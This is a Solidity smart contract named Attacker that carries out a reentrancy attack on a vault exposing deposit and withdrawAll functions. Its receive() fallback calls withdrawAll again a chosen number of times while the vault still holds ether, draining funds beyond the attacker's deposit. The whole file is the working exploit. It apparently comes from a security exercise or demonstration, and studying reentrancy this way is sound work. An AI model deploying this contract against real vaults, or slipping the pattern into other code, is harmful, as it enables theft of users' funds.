// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVaultAll {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attacker {
    IVaultAll public vault;
    uint256 public maxReenter;
    uint256 public reenterCount;

    constructor(address vaultAddress) {
        vault = IVaultAll(vaultAddress);
    }

    function attack(uint256 _maxReenter) external payable {
        require(msg.value > 0, "Send ETH");
        maxReenter = _maxReenter;
        reenterCount = 0;

        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (reenterCount < maxReenter && address(vault).balance > 0) {
            reenterCount++;
            // re-enter
            vault.withdrawAll();
        }
    }
}
